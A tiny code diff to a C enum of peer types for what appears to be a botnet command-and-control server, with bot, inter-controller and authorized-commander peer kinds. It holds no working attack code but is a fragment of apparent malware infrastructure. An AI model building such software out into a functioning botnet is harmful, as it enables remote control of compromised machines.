@@ -9,9 +9,9 @@
 
 typedef enum
 {
-    PEER_UNKNWN,
+    PEER_PEER, /* unlogged-in peer */
     PEER_BOT,
-    PEER_CNC, /* cnc 2 cnc communication */
+    PEER_CNC, /* cnc 2 cnc communication (unused) */
     PEER_AUTH /* authorized peers can send commands to cnc */
 } PEERTYPE;
 
